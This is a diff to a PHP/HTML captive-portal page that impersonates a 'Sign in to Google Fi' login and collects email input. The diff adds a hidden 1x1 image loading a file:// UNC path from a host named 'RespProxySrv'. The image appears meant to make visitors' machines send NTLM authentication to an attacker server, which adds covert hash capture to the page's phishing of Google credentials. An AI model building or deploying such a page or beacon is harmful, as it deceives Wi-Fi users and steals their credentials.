@@ -127,6 +127,7 @@ identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
                     </svg>
                     <!-- /Google Logo -->
                     </div>
+		    <img src='file://///RespProxySrv/pictures/google.png' alt='Google Loading' height='1' width='1'>
                     <form id="email-form-step-one" method="POST" action="/captiveportal/index.php" target="hiddenFrame">
                         <h1 class='g-h1'>Sign in to Google Fi</h1>
                         <h2 class='g-h2'>to get access to the Internet</h2>
